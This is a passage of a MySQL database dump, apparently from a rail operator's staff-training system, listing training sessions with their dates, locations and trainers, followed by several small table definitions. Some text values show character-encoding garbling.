  `hora_inicio` time NOT NULL,
  `hora_fin` time NOT NULL,
  `curso_id` int(11) NOT NULL,
  `lugar` varchar(255) DEFAULT NULL,
  `observacion` text NOT NULL,
  `formador` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `curso_id` (`curso_id`),
  CONSTRAINT `formaciones_ibfk_1` FOREIGN KEY (`curso_id`) REFERENCES `cursos` (`id`) ON UPDATE NO ACTION
) ENGINE=InnoDB AUTO_INCREMENT=293 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `formaciones`
--

LOCK TABLES `formaciones` WRITE;
/*!40000 ALTER TABLE `formaciones` DISABLE KEYS */;
INSERT INTO `formaciones` VALUES (26,'2017-11-29','2017-11-29','08:00:00','17:00:00',5,NULL,'',NULL),(27,'2017-11-30','2017-11-30','08:00:00','17:00:00',6,NULL,'',NULL),(28,'2017-03-23','2017-03-23','08:00:00','14:00:00',4,NULL,'',NULL),(29,'2017-03-15','2017-03-15','08:00:00','14:00:00',4,NULL,'FormaciГіn en dos turnos por la maГұana y otros dos por la tarde',NULL),(30,'2017-03-06','2017-03-06','08:00:00','14:00:00',4,NULL,'',NULL),(31,'2017-03-01','2017-03-01','08:00:00','14:00:00',4,NULL,'',NULL),(32,'2017-03-21','2017-03-21','09:00:00','17:00:00',4,NULL,'FormaciГіn en dos turnos por la maГұana y otros dos por la tarde',NULL),(33,'2017-03-16','2017-03-16','09:00:00','17:00:00',4,NULL,'',NULL),(34,'2016-11-21','2016-11-21','08:00:00','14:00:00',11,NULL,'',NULL),(35,'2018-03-13','2018-03-13','08:00:00','14:00:00',13,NULL,'','UNAI LOPEZ'),(36,'2018-03-14','2018-03-14','08:00:00','14:00:00',13,NULL,'','UNAI LOPEZ'),(37,'2017-11-21','2017-11-21','09:00:00','14:00:00',14,NULL,'','EXTERNO'),(40,'2018-05-09','2018-05-23','15:00:00','18:30:00',14,'','3 dГӯas  9, 16 y 23 de mayo',''),(43,'2018-09-26','2018-10-10','09:30:00','13:00:00',14,'','3 dГӯas, 26 de Septiembre, 3 y 10 de Octubre',''),(44,'2017-11-13','2017-11-13','08:00:00','14:00:00',11,NULL,'LEBARIO',''),(45,'2017-11-27','2017-11-27','08:00:00','14:00:00',15,NULL,'LEBARIO',''),(46,'2017-11-23','2017-11-23','08:00:00','14:00:00',14,NULL,'BILBAO',''),(48,'2018-02-15','2018-02-15','09:30:00','13:00:00',14,NULL,'',''),(49,'2018-02-09','2018-02-23','09:30:00','13:00:00',14,'','3 dГӯas 9, 15 y 23 de febrero',''),(50,'2018-03-15','2018-03-15','09:00:00','14:00:00',11,'ISPASTER','','SUESKOLA'),(51,'2018-03-16','2018-03-16','08:30:00','13:00:00',11,'ORDIZIA','','SUESKOLA'),(52,'2018-04-09','2018-04-13','08:00:00','14:30:00',16,'AULA FORMACIГ“N TALLER DE LUTXANA','','ALBERTO ARAS'),(53,'2018-04-23','2018-04-27','08:00:00','14:30:00',17,'AULA FORMACIГ“N TALLER DE LUTXANA','','ALBERTO ARAS'),(54,'2018-05-17','2018-05-17','09:00:00','11:00:00',4,'AMARA','','JUAN CARLOS ENRIQUE'),(55,'2018-05-17','2018-05-17','13:00:00','14:00:00',12,'AMARA','','JUAN CARLOS ENRIQUE'),(56,'2018-05-17','2018-05-17','11:00:00','13:00:00',18,'AMARA','','JUAN CARLOS ENRIQUE'),(57,'2018-06-06','2018-06-06','15:00:00','18:00:00',20,'BILBAO','','Enrique GonzГЎlez'),(58,'2018-06-14','2018-06-14','15:00:00','18:00:00',20,'BILBAO','','Enrique GonzГЎlez'),(59,'2018-06-14','2018-06-14','08:00:00','13:00:00',19,'BILBAO','','ENRIQUE GONZALEZ'),(60,'2018-09-10','2018-09-21','09:00:00','14:00:00',14,'','','EXTERNO'),(61,'2018-09-11','2018-09-24','09:00:00','14:00:00',14,'','','EXTERNO'),(62,'2018-09-17','2018-09-28','09:00:00','14:00:00',14,'','','EXTERNO'),(68,'2018-11-05','2018-11-05','08:00:00','14:30:00',15,'AMARA','CURSO IMPARTIDO POR LA DYA',''),(69,'2018-11-07','2018-11-07','08:00:00','14:30:00',15,'ALBIA','CURSO IMPARTIDO POR LA DYA',''),(70,'2013-10-23','2013-10-23','08:00:00','17:00:00',15,'DONOSTIA','',''),(71,'2013-10-30','2013-10-30','08:00:00','17:00:00',15,'ATXURI','',''),(72,'2014-01-08','2014-01-08','08:00:00','17:00:00',15,'DONOSTIA','',''),(74,'2016-11-15','2016-11-15','08:00:00','17:00:00',15,'','',''),(76,'2016-11-24','2016-11-24','08:00:00','17:00:00',15,'','',''),(77,'2016-11-29','2016-11-29','08:00:00','17:00:00',15,'','',''),(78,'2016-12-01','2016-12-01','08:00:00','17:00:00',15,'','',''),(79,'2015-01-01','2015-01-01','08:00:00','17:00:00',15,'DONOSTIA','',''),(80,'2018-10-23','2018-10-29','09:00:00','14:00:00',26,'ALBIA','curso dГӯas 23,25 y 29 de Octubre','FERNANDO ROMERO'),(81,'2018-11-06','2018-11-12','08:00:00','14:00:00',26,'ALBIA','DГӯas 6, 8 y 12',''),(82,'2018-11-19','2018-11-22','08:00:00','17:00:00',26,'DONOSTIA','DIAS 19,20 Y 22',''),(83,'2019-01-09','2019-01-09','08:00:00','14:00:00',5,'ALBIA','',''),(84,'2019-01-11','2019-01-11','08:00:00','14:00:00',6,'ALBIA','',''),(85,'2018-11-14','2018-11-14','10:00:00','13:00:00',27,'PM ATXURI','PUESTO DE MANDO DE ATXURI','JAVIER CAMPOAMOR'),(86,'2018-11-15','2018-11-15','09:00:00','12:00:00',27,'PM ATXURI','PUESTO DE MANDO DE ATXURI','JAVIER CAMPOAMOR'),(87,'2018-11-14','2018-11-14','15:00:00','18:00:00',27,'PM ATXURI','PUESTO DE MANDO DE ATXURI','JAVIER CAMPOAMOR'),(90,'2018-12-10','2018-12-10','10:00:00','17:30:00',28,'DONOSTIA','Horario:\r\nMaГұana de 10 a 12: 2 grupos (1 hora cada uno)\r\nTarde de 15,30 a 17,30: 2 grupos (1 hora cada uno)','JOSE ANTONIO PULIDO'),(93,'2018-12-17','2018-12-17','10:00:00','17:30:00',28,'DONOSTIA','Horario:\r\nMaГұana de 10 a 12: 2 grupos (1 hora cada uno)\r\nTarde de 15,30 a 17,30: 2 grupos (1 hora cada uno)\r\n','JOSE ANTONIO PULIDO'),(95,'2018-12-03','2018-12-03','10:00:00','17:30:00',28,'DONOSTIA','Horario:\r\nMaГұana de 10 a 12: 2 grupos (1 hora cada uno)\r\nTarde de 15,30 a 17,30: 2 grupos (1 hora cada uno)','JOSE ANTONIO PULIDO'),(96,'2016-01-01','2016-01-01','08:00:00','17:00:00',5,'','AGENTES ASISTENTES CURSOS ANTERIORES',''),(97,'2016-01-01','2016-01-01','08:00:00','17:00:00',6,'','AGENTES ASISTENTES CURSOS ANTERIORES',''),(98,'2019-12-04','2019-12-04','11:00:00','12:00:00',30,'LEBARIO','','RICARDO UNZUETA'),(99,'2019-11-25','2019-11-29','08:00:00','14:00:00',16,'AMARA','','LUIS FRANCISCO FERNANDEZ'),(100,'2019-11-28','2019-11-28','08:00:00','14:00:00',19,'AMARA','','ENRIQUE GONZALEZ'),(101,'2019-12-02','2019-12-02','08:00:00','14:00:00',17,'AMARA','','MANU HURTADO'),(102,'2019-12-04','2019-12-04','09:30:00','10:30:00',13,'LEBARIO','','AITOR AMILIBIA'),(103,'2019-12-03','2019-12-03','08:00:00','14:00:00',32,'LEBARIO','VerificaciГіn de tensiГіn, puesta a tierra y accionamiento manual seccionadores','UNAI LOPEZ'),(104,'2020-02-14','2020-02-14','08:00:00','14:00:00',11,'SU ESKOLA ORDIZIA','',''),(105,'2020-01-29','2020-01-29','08:00:00','10:30:00',33,'P.M.Atxuri','','Enrique GonzГЎlez'),(106,'2020-02-25','2020-02-25','08:00:00','17:00:00',34,'DONOSTIA','FORMACION DE 15\' PARA LOS TURNOS DE MAГ‘ANA Y DE TARDE','ANDRES ALVAREZ(SAMPOL)'),(107,'2020-02-26','2020-02-26','08:00:00','14:00:00',15,'LEBARIO','',''),(108,'2020-07-10','2020-07-10','07:30:00','14:00:00',36,'LEBARIO','','JUAN CARLOS ENRIQUE'),(109,'2020-07-13','2020-07-13','07:30:00','09:30:00',36,'LEBARIO','','JUAN CARLOS ENRIQUE'),(110,'2020-07-02','2020-07-02','07:30:00','14:00:00',19,'LEBARIO','','ENRIQUE GONZALEZ'),(111,'2020-07-03','2020-07-09','07:30:00','14:30:00',16,'LEBARIO','','LUIS FRANCISCO FERNANDEZ Y AITOR LLONA'),(112,'2020-07-12','2020-07-12','12:00:00','14:00:00',37,'LEBARIO','',''),(113,'2020-07-13','2020-07-13','09:30:00','14:00:00',38,'LEBARIO','',''),(114,'2020-07-14','2020-07-14','07:30:00','14:00:00',39,'LEBARIO','','AITOR LLONA'),(115,'2020-07-15','2020-07-15','07:30:00','10:30:00',32,'LEBARIO','',''),(116,'2020-07-15','2020-07-15','11:00:00','13:00:00',13,'LEBARIO','',''),(117,'2020-07-15','2020-07-15','13:00:00','14:00:00',40,'LEBARIO','','AITOR CANIBE'),(118,'2020-07-10','2020-07-10','07:30:00','14:00:00',41,'TODAS LAS LINEAS','',''),(119,'2020-07-20','2020-07-20','07:30:00','14:00:00',19,'ATXURI','','JOSE ENRIQUE GONZALEZ'),(121,'2020-07-22','2020-06-23','07:30:00','14:00:00',42,'ATXURI','','AITOR LLONA'),(122,'2020-07-24','2020-07-24','07:30:00','14:00:00',43,'ATXURI','','AITOR LLONA'),(123,'2020-07-27','2020-07-27','07:30:00','14:00:00',44,'ESTACION ARIZ','','AITOR LLONA'),(124,'2020-07-28','2020-07-28','07:30:00','14:00:00',45,'ATXURI','','AITOR LLONA'),(125,'2020-07-29','2020-07-29','09:30:00','14:00:00',17,'ATXURI','PLAN DE AUTOPROTECCION + NORMAS SEGURIDAD','MANUEL HURTADO'),(126,'2020-07-30','2020-07-30','07:30:00','14:00:00',39,'LINEA BIZKAIA','','AITOR LLONA'),(127,'2020-09-10','2020-09-10','07:00:00','15:00:00',5,'LEBARIO','','ESM'),(128,'2020-09-11','2020-09-11','07:00:00','15:00:00',6,'LEBARIO','','ESM'),(129,'2020-09-14','2020-09-14','07:30:00','14:00:00',36,'ATXURI','','JUAN CARLOS ENRIQUE'),(130,'2020-09-15','2020-09-15','07:30:00','09:30:00',36,'ATXURI','','JUAN CARLOS ENRIQUE'),(131,'2020-09-08','2020-09-08','07:30:00','14:00:00',19,'ATXURI','','ENRIQUE GONZLEZ'),(132,'2020-09-09','2020-09-09','11:00:00','13:00:00',13,'LEBARIO','',''),(133,'2020-09-09','2020-09-09','07:30:00','09:30:00',32,'LEBARIO','',''),(134,'2020-09-09','2020-09-09','13:00:00','14:00:00',37,'LEBARIO','',''),(135,'2020-09-15','2020-09-15','09:30:00','14:00:00',38,'ATXURI','','SUSANA SALCEDO Y ALBERTO ARAS'),(137,'2020-10-20','2020-10-23','07:00:00','14:30:00',16,'LEBARIO','RCS PARA TГүCNICOS DE RED','AITOR LLONA'),(138,'2020-10-26','2020-10-28','07:00:00','14:30:00',42,' ATXURI','','AITOR LLONA'),(139,'2020-10-30','2020-10-30','07:00:00','14:30:00',43,' ATXURI','','AITOR LLONA'),(140,'2020-11-02','2020-11-02','07:00:00','14:30:00',44,' ESTACION ARIZ MERCANCIAS','','AITOR LLONA'),(141,'2020-11-03','2020-11-03','07:00:00','14:30:00',45,' ESTACION LUTXANA MERCANCIAS','','AITOR LLONA'),(142,'2021-01-25','2021-01-25','07:00:00','14:30:00',39,'LINEA BIZKAIA','','AITOR LLONA BARRENETXEA'),(143,'2020-11-04','2020-11-04','07:00:00','14:30:00',38,' ATXURI','','ALBERTO ARAS BOCANEGRA'),(144,'2021-01-13','2021-01-19','07:30:00','14:00:00',16,'P.M. ATXURI','R.C.S. PARA TECNICO DE RED HABILITADO','AITOR LLONA BARRENETXEA'),(145,'2021-01-26','2021-01-26','07:00:00','14:30:00',39,'LINEA BIZKAIA','','AITOR LLONA BARRENETXEA'),(146,'2021-01-20','2021-01-21','07:00:00','14:00:00',36,'ATXURI','','JUAN CARLOS ENRIQUE'),(147,'2021-01-22','2021-01-22','12:00:00','13:00:00',40,'LEBARIO','','Aketza Barcena'),(148,'2021-01-21','2021-01-21','09:30:00','14:00:00',38,'atxuri','','Alberto Aras'),(149,'2021-01-22','2021-01-22','08:00:00','12:00:00',32,'LEBARIO','','Unai'),(150,'2021-02-11','2021-02-11','09:30:00','11:30:00',32,'ARASO','','Unai LГіpez'),(151,'2021-02-11','2021-02-11','11:30:00','13:30:00',13,'ARASO','','Unai LГіpez'),(152,'2021-02-22','2021-02-22','08:00:00','14:30:00',46,'P.M. ATXURI','','AITOR CANIBE'),(153,'2021-02-23','2021-02-23','08:00:00','14:30:00',46,'P.M. ATXURI','','AITOR CANIBE'),(154,'2021-02-24','2021-02-24','08:00:00','14:30:00',46,'P.M. ATXURI','','AITOR CANIBE'),(155,'2021-02-25','2021-02-25','08:00:00','14:30:00',46,'P.M. ATXURI','','AITOR CANIBE'),(156,'2021-02-26','2021-02-26','08:00:00','14:30:00',46,'P.M. ATXURI','','AITOR CANIBE'),(157,'2021-04-08','2021-04-14','07:30:00','14:00:00',16,'P.M AMARA','','AITOR LLONA BARRENETXEA'),(158,'2021-04-19','2021-04-19','07:00:00','14:30:00',39,'LINEA BIZKAIA','','AITOR LLONA BARRENETXEA'),(159,'2021-03-02','2021-03-02','08:00:00','14:00:00',19,'AMARA','','JosГ© Enrique GonzГЎlez'),(160,'2021-03-03','2021-03-04','07:30:00','14:00:00',36,'DONOSTIA','','JUAN CARLOS ENRIQUE'),(161,'2021-03-04','2021-03-04','09:30:00','14:00:00',38,'DONOSTIA AMARA','','MANU HURTADO'),(163,'2021-02-11','2021-02-11','08:00:00','14:00:00',46,'atxuri','','Aitor Canibe'),(164,'2021-01-27','2021-01-27','08:00:00','14:00:00',47,'atxuri','','Aitor Canibe'),(165,'2021-04-07','2021-04-07','07:30:00','14:00:00',19,'P.M. AMARA','','JOSE ENRIQUE GONZALEZ'),(166,'2021-04-15','2021-04-16','10:00:00','14:00:00',36,'AMARA','','JUAN CARLOS ENRIQUE'),(167,'2021-04-16','2021-04-16','11:00:00','14:00:00',38,'AMARA','','MANU HURTADO'),(168,'2021-06-02','2021-06-02','08:00:00','14:00:00',48,'LEBARIO','','Unai Lopez'),(169,'2021-06-04','2021-06-04','08:00:00','14:00:00',48,'LEBARIO','','Unai LГіpez'),(170,'2021-06-08','2021-06-08','08:00:00','14:00:00',48,'LEBARIO','','Unai LГіpez'),(171,'2021-06-11','1920-06-11','08:00:00','14:00:00',48,'LEBARIO','','Unai LГіpez'),(172,'2021-06-14','2021-06-14','08:00:00','14:00:00',48,'LEBARIO','','Unai LГіpez'),(173,'2021-06-16','2021-06-16','08:00:00','14:00:00',48,'LEBARIO','','Unai LГіpez'),(174,'2021-06-23','2021-06-23','09:00:00','13:00:00',11,'ORDITZIA','','SUESKOLA'),(175,'2021-06-24','2021-06-24','09:00:00','13:00:00',11,'ORDITZIA','','SUESKOLA'),(176,'2021-06-29','2021-06-29','09:00:00','13:00:00',11,'SUESKOLA','',''),(177,'2021-06-23','2021-06-23','09:00:00','15:00:00',15,'LEBARIO','','DYA'),(178,'2021-06-28','2021-06-28','09:00:00','15:00:00',15,'LEBARIO','','DYA'),(179,'2021-06-30','2021-06-30','09:00:00','15:00:00',15,'LEBARIO','','DYA'),(180,'2021-07-19','2021-07-19','12:00:00','14:00:00',13,'LEBARIO','','Unai'),(181,'2021-07-19','2021-07-19','08:00:00','10:00:00',32,'LEBARIO','','Unai'),(182,'2021-07-19','2021-07-19','11:00:00','12:00:00',40,'LEBARIO','','Aketza Barcena'),(183,'2021-07-16','2021-07-16','07:30:00','14:00:00',39,'LEBARIO','','AITOR LLONA'),(184,'2021-07-15','2021-07-15','11:00:00','14:00:00',38,'ARASO','','MANU HURTADO'),(185,'2021-07-14','2021-07-14','07:30:00','14:00:00',36,'ARASO','','JUAN CARLOS'),(186,'2021-07-15','2021-07-15','07:30:00','09:30:00',36,'ARASO','','JUAN CARLOS'),(187,'2021-07-07','2021-07-13','08:00:00','14:00:00',16,'ARASO','','AITOR LLONA'),(188,'2021-07-06','2021-07-06','08:00:00','14:00:00',19,'ARASO','','AITOR LLONA'),(189,'2021-09-28','2021-09-28','08:00:00','14:00:00',15,'LEBARIO','',''),(190,'2021-09-22','2021-09-22','09:00:00','14:00:00',11,'ORDIZIA','','SUESKOLA'),(191,'2021-10-01','2021-10-01','09:00:00','14:00:00',11,'ORDIZIA','','SUESKOLA'),(192,'2021-10-01','2021-10-01','08:00:00','14:00:00',49,'P.M. ATXURI','','IVAN CORDON'),(193,'2021-10-04','2021-10-04','08:00:00','14:00:00',49,'P.M. ATXURI','','IVAN CORDON'),(194,'2021-10-15','2021-10-15','08:00:00','14:00:00',49,'P.M. AMARA','','IVAN CORDON'),(195,'2021-10-18','2021-10-18','08:00:00','14:00:00',49,'P.M. AMARA','','IVAN CORDON'),(196,'2021-10-19','2021-10-19','08:00:00','15:00:00',6,'ARASO','',''),(197,'2021-10-20','2021-10-20','08:00:00','15:00:00',5,'ARASO','',''),(198,'2021-11-01','2021-12-31','08:00:00','17:00:00',50,'ONLINE','CURSO TEORICO ONLINE','AITOR LLONA'),(199,'2022-03-14','2022-03-14','10:00:00','11:00:00',51,'TELEMATICA','La formaciГіn es de una hora en 5 grupos','VERONICA RODRIGUEZ'),(208,'2022-03-15','2022-03-15','10:00:00','15:00:00',51,'TELEMATICA','La formaciГіn es de una hora en 5 grupos ','VERONICA RODRIGUEZ'),(209,'2022-03-16','2022-03-16','10:00:00','15:00:00',51,'TELEMATICA','La formaciГіn es de una hora en 5 grupos','VERONICA RODRIGUEZ'),(210,'2022-03-17','2022-03-17','10:00:00','15:00:00',51,'TELEMATICA','La formaciГіn es de una hora en 5 grupos','VERONICA RODRIGUEZ'),(211,'2022-03-18','2022-03-18','10:00:00','15:00:00',51,'TELEMATICA','La formaciГіn es de una hora en 5 grupos','VERONICA RODRIGUEZ'),(212,'2022-03-21','2022-03-21','10:00:00','15:00:00',51,'TELEMATICO','La formaciГіn es de una hora en 5 grupos','VERONICA RODRIGUEZ'),(213,'2022-03-22','2022-03-22','10:00:00','15:00:00',51,'TELEMATICA','La formaciГіn es de una hora en 5 grupos','VERONICA RODRIGUEZ'),(214,'2022-03-24','2022-03-24','10:00:00','15:00:00',51,'TELEMATICA','La formaciГіn es de una hora en 5 grupos','VERONICA RODRIGUEZ'),(215,'2022-03-25','2022-03-25','10:00:00','15:00:00',51,'TELEMATICA','La formaciГіn es de una hora en 5 grupos','VERONICA RODRIGUEZ'),(216,'2022-03-29','2022-03-29','10:00:00','15:00:00',51,'TELEMATICA','La formaciГіn es de una hora en 5 grupos','VERONICA RODRIGUEZ'),(217,'2022-05-05','2022-05-05','08:00:00','14:00:00',15,'LEBARIO','','DYA GIPUZKOA'),(218,'2022-05-06','2022-05-06','08:00:00','14:00:00',15,'LEBARIO','','DYA GIPUZKOA'),(219,'2022-05-11','2022-05-11','08:00:00','14:30:00',52,'atxuri','','Aitor Canibe'),(220,'2022-05-20','2022-05-20','08:00:00','14:30:00',52,'atxuri','','Aitor Canibe'),(221,'2022-06-10','2022-06-10','09:00:00','14:00:00',11,'ORDIZIA','','SU ESKOLA'),(222,'2022-07-12','2022-07-12','09:00:00','14:00:00',11,'ORDIZIA','','SU ESKOLA'),(223,'2022-06-20','2022-06-20','08:00:00','14:00:00',19,'ALBIA','','ENRIQUE GONZALEZ'),(224,'2022-09-22','2022-09-22','08:00:00','14:30:00',5,'ARASO','','Pilar Calvo Holgado ESM'),(225,'2022-09-23','2022-09-23','08:00:00','14:30:00',6,'ARASO','','Pilar Calvo Holgado ESM'),(227,'2022-11-28','2022-11-28','07:00:00','14:00:00',36,'ARASO','','JUAN CARLOS ENRIQUE'),(228,'2022-11-28','2022-11-28','13:00:00','14:00:00',51,'ARASO','','JUAN CARLOS ENRIQUE'),(229,'2022-12-12','2022-12-12','08:00:00','08:10:00',53,'PUESTOS DE MANDO','VIDEOCONFERENCIA','JUAN CARLOS ENRIQUE'),(230,'2022-12-19','2022-12-19','08:00:00','17:00:00',54,'DONOSTIA','','ONLINE FORMAKUNTXA'),(231,'2023-02-06','2023-02-06','09:00:00','14:00:00',11,'ORDIZIA','','SU ESKOLA'),(232,'2023-03-31','2023-03-31','08:00:00','14:00:00',15,'AMARA','','DYA GIPUZKOA'),(233,'2023-03-28','2023-03-28','09:00:00','13:30:00',11,'SUESKOLA ORDIZIA','','SUESKOLA ORDIZIA'),(234,'2023-04-20','2023-04-20','08:00:00','14:30:00',39,'BIZKAIA','','AITOR LLONA'),(235,'2023-04-21','2023-04-21','09:30:00','11:30:00',9,'P.M. ATXURI','','SUSANA SALCEDO'),(236,'2023-04-18','2023-04-18','09:00:00','12:00:00',48,'LEBARIO','','UNAI LOPEZ'),(237,'2023-04-18','2023-04-18','12:00:00','14:00:00',40,'LEBARIO','','ASIER ELENA (EUSKOTREN)'),(238,'2023-05-03','2023-05-03','08:00:00','14:00:00',15,'ALBIA','','DYA'),(239,'2023-05-04','2023-05-04','08:00:00','14:00:00',15,'ALBIA','','DYA'),(240,'2023-05-15','2023-05-15','09:00:00','13:00:00',11,'ORDIZIA','','SU ESKOLA'),(241,'2023-05-22','2023-05-22','09:00:00','13:00:00',11,'ORDIZIA','','SU ESKOLA'),(242,'2023-05-10','2023-05-10','09:30:00','13:30:00',15,'AMARA','','SOS DEIAK'),(243,'2023-05-16','2023-05-16','09:30:00','13:30:00',15,'AMARA','','SOS DEIAK'),(244,'2023-06-14','2023-06-14','06:30:00','12:30:00',36,'DONOSTIA','','JUAN CARLOS ENRIQUE'),(245,'2023-07-28','2023-07-28','07:00:00','14:00:00',56,'AMARA','','JUAN CARLOS ENRIQUE'),(246,'2023-08-30','2023-08-31','08:00:00','14:00:00',57,'DONOSTIA AMARA','','JUAN CARLOS ENRIQUE'),(247,'2023-09-19','2023-09-19','09:00:00','13:00:00',11,'SU ESKOLA','','SU ESKOLA'),(249,'2023-10-10','2023-10-10','09:00:00','14:00:00',11,'ORDIZIA','','SUESKOLA'),(250,'2023-09-26','2023-09-26','09:00:00','14:00:00',11,'ORDIZIA','','SUESKOLA'),(251,'2023-09-20','2023-09-21','08:00:00','14:00:00',57,'DONOSTIA','','JUAN CARLOS ENRIQUE'),(252,'2024-02-20','2024-02-20','09:00:00','14:00:00',58,'Edificio Albia','Presencial','Talio'),(253,'2023-07-13','2023-07-13','08:00:00','14:00:00',5,'ARASO','','ESM'),(254,'2023-07-14','2023-07-14','08:00:00','14:00:00',6,'ARASO','','ESM'),(255,'2023-11-13','2023-11-13','08:00:00','17:00:00',59,'LEBARIO','','ESM'),(256,'2023-12-15','2023-12-15','08:00:00','14:00:00',60,'LEBARIO','','ESM'),(257,'2024-05-17','2024-05-17','08:00:00','14:00:00',59,'LEBARIO','','ESM'),(258,'2024-05-21','2024-05-21','08:00:00','14:00:00',60,'LEBARIO','','ESM'),(259,'2024-05-15','2024-05-15','08:00:00','14:00:00',6,'LEBARIO','','ESM'),(260,'2024-05-16','2024-05-16','08:00:00','14:00:00',5,'LEBARIO','','ESM'),(261,'2024-09-16','2024-09-16','08:00:00','14:00:00',49,'LEBARIO','','INSITEL'),(262,'2024-09-20','2024-09-20','08:00:00','14:00:00',49,'LEBARIO','','INSITEL'),(263,'2024-09-23','2024-09-23','08:00:00','14:00:00',49,'LEBARIO','','INSITEL'),(264,'2024-09-27','2024-09-27','08:00:00','14:00:00',49,'LEBARIO','','INSITEL'),(265,'2024-10-31','2024-10-31','08:00:00','14:00:00',49,'LEBARIO','','INSITEL'),(266,'2024-12-19','2024-12-19','09:00:00','13:30:00',15,'AMARA','',''),(267,'2025-05-27','2025-05-27','08:00:00','14:00:00',59,'LEBARIO','','ESM'),(268,'2025-05-23','2025-05-23','08:00:00','14:00:00',58,'LEBARIO','','ESM'),(269,'2025-05-12','2025-05-12','08:00:00','14:00:00',58,'LEBARIO','','ESM'),(270,'2025-05-26','2025-05-26','08:00:00','14:00:00',60,'LEBARIO','','ESM'),(271,'2025-06-17','2025-06-17','09:00:00','13:00:00',11,'SUESKOLA ORDIZIA','','SUESKOLA'),(272,'2025-09-08','2025-09-08','08:00:00','14:00:00',61,'Gipuzkoa','',''),(273,'2025-09-12','2025-09-12','08:00:00','14:00:00',61,'Gipuzkoa','',''),(274,'2025-09-09','2025-09-09','08:00:00','14:00:00',61,'Bizkaia','',''),(275,'2025-09-15','2025-09-15','08:00:00','14:00:00',61,'Bizkaia','',''),(276,'2025-10-03','2025-10-03','08:00:00','14:00:00',6,'LEBARIO','','ESM'),(278,'2025-10-24','2025-10-24','08:00:00','14:00:00',5,'LEBARIO','','ESM'),(279,'2025-10-30','2025-10-30','08:00:00','14:00:00',58,'LEBARIO','','ESM'),(280,'2025-10-21','2025-10-21','08:00:00','14:00:00',11,'BEASAIN','','SU ESKOLA'),(282,'2025-12-02','2025-12-02','09:30:00','13:30:00',15,'AMARA','','DYA'),(283,'2026-01-28','2026-01-28','08:00:00','14:00:00',5,'LEBARIO','','E.S.M.'),(284,'2026-01-30','2026-01-30','08:00:00','14:00:00',6,'LEBARIO','','E.S.M.'),(285,'2026-01-27','2026-01-27','08:00:00','14:00:00',15,'AMARA','','DYA'),(286,'2026-01-29','2026-01-29','08:00:00','14:00:00',11,'BEASAIN','','SU ESKOLA'),(287,'2026-02-18','2026-02-18','08:00:00','14:00:00',58,'DONOSTIA','','ESM'),(288,'2026-04-29','2026-04-29','09:00:00','13:00:00',61,'FICOBA','',''),(289,'2026-05-13','2026-05-13','09:00:00','13:00:00',61,'FICOBA','',''),(290,'2026-05-27','2026-05-27','09:00:00','13:00:00',61,'FICOBA','',''),(291,'2026-04-22','2026-04-22','08:00:00','17:00:00',61,'ZIERBENA','',''),(292,'2026-05-06','2026-05-06','08:00:00','17:00:00',61,'ZIERBENA','','');
/*!40000 ALTER TABLE `formaciones` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `idiomas`
--

DROP TABLE IF EXISTS `idiomas`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `idiomas` (
  `locale` varchar(20) NOT NULL,
  `idioma` varchar(20) NOT NULL,
  PRIMARY KEY (`locale`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `idiomas`
--

LOCK TABLES `idiomas` WRITE;
/*!40000 ALTER TABLE `idiomas` DISABLE KEYS */;
INSERT INTO `idiomas` VALUES ('es_ES','CASTELLANO'),('eu_ES','EUSKERA');
/*!40000 ALTER TABLE `idiomas` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `inspecciones`
--

DROP TABLE IF EXISTS `inspecciones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `inspecciones` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `fecha` datetime NOT NULL,
  `inspector` int(11) NOT NULL,
  `estacion` int(11) NOT NULL,
  `tipoInspeccion` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `inspecciones`
--

LOCK TABLES `inspecciones` WRITE;
/*!40000 ALTER TABLE `inspecciones` DISABLE KEYS */;
/*!40000 ALTER TABLE `inspecciones` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `lugares_reconocimientos`
--

DROP TABLE IF EXISTS `lugares_reconocimientos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `lugares_reconocimientos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `lugar` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `lugares_reconocimientos`
--

LOCK TABLES `lugares_reconocimientos` WRITE;
/*!40000 ALTER TABLE `lugares_reconocimientos` DISABLE KEYS */;
INSERT INTO `lugares_reconocimientos` VALUES (1,'BILBAO'),(2,'DURANGO'),(3,'BASAURI'),(4,'GERNIKA'),(5,'ERANDIO'),(6,'EIBAR'),(7,'DONOSTIA'),(8,'IURRETA'),(9,'BARAKALDO');
/*!40000 ALTER TABLE `lugares_reconocimientos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `observaciones`
--

DROP TABLE IF EXISTS `observaciones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `observaciones` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `codigo_agente` int(11) NOT NULL,
  `observacion` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `codigo_agente` (`codigo_agente`),
  CONSTRAINT `observaciones_ibfk_1` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`)
